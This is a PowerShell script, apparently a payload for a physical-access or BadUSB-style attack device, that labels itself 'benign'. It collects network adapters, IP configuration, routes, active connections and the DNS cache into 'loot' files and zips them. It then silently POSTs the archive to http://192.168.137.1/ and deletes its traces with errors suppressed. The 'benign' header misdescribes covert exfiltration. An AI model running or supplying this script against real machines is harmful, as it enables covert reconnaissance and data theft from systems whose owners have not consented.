# Benign network configuration collection script
# Collects network interface and routing information

# Helper function to write UTF-8 files (readable on Android/Linux)
function Write-LootFile {
    param([string]$Path, [string]$Content)
    try {
        $utf8NoBom = New-Object System.Text.UTF8Encoding $false
        $bytes = $utf8NoBom.GetBytes($Content)
        [System.IO.File]::WriteAllBytes($Path, $bytes)
    } catch {
        $Content | Out-File -FilePath $Path -Encoding ASCII -Force
    }
}

$OutputDir = "$env:TEMP\loot_$PID"
New-Item -ItemType Directory -Path $OutputDir -Force | Out-Null

# Network adapters
$content = "=== Network Adapters ===`n" + (Get-NetAdapter | Format-List | Out-String) + "`n" + (ipconfig /all | Out-String)
Write-LootFile -Path "$OutputDir\network_config.txt" -Content $content

# IP configuration
$content = "=== IP Configuration ===`n" + (Get-NetIPAddress | Format-Table -AutoSize | Out-String -Width 200) + "`n" + (Get-NetIPConfiguration | Format-List | Out-String)
Write-LootFile -Path "$OutputDir\ip_config.txt" -Content $content

# Routing table
$content = "=== Routing Table ===`n" + (Get-NetRoute | Format-Table -AutoSize | Out-String -Width 200) + "`n" + (route print | Out-String)
Write-LootFile -Path "$OutputDir\routes.txt" -Content $content

# Active connections
$content = "=== Active Connections ===`n" + (Get-NetTCPConnection | Format-Table -AutoSize | Out-String -Width 200) + "`n" + (netstat -ano | Out-String)
Write-LootFile -Path "$OutputDir\connections.txt" -Content $content

# DNS cache
try {
    $content = "=== DNS Cache ===`n" + (Get-DnsClientCache | Format-Table -AutoSize | Out-String -Width 200)
    Write-LootFile -Path "$OutputDir\dns.txt" -Content $content
} catch {
    Write-LootFile -Path "$OutputDir\dns.txt" -Content "DNS cache collection failed"
}

# Create archive with forward slashes (Android compatible)
$ArchivePath = "$env:TEMP\loot.zip"
if (Test-Path $ArchivePath) { Remove-Item -Force $ArchivePath -ErrorAction SilentlyContinue }

try {
    Add-Type -AssemblyName System.IO.Compression.FileSystem
    $zip = [System.IO.Compression.ZipFile]::Open($ArchivePath, 'Create')
    try {
        Get-ChildItem -Path $OutputDir -File -Recurse | ForEach-Object {
            $relativePath = $_.FullName.Substring($OutputDir.Length + 1).Replace('\', '/')
            $entry = $zip.CreateEntry($relativePath)
            $entryStream = $entry.Open()
            try {
                $fileStream = [System.IO.File]::OpenRead($_.FullName)
                try { $fileStream.CopyTo($entryStream) } finally { $fileStream.Close() }
            } finally { $entryStream.Close() }
        }
    } finally { $zip.Dispose() }
} catch {
    Compress-Archive -Path $OutputDir -DestinationPath $ArchivePath -Force
}

Invoke-RestMethod -Uri "http://192.168.137.1/" -Method Post -InFile $ArchivePath -ErrorAction SilentlyContinue
Remove-Item -Recurse -Force $OutputDir, $ArchivePath -ErrorAction SilentlyContinue
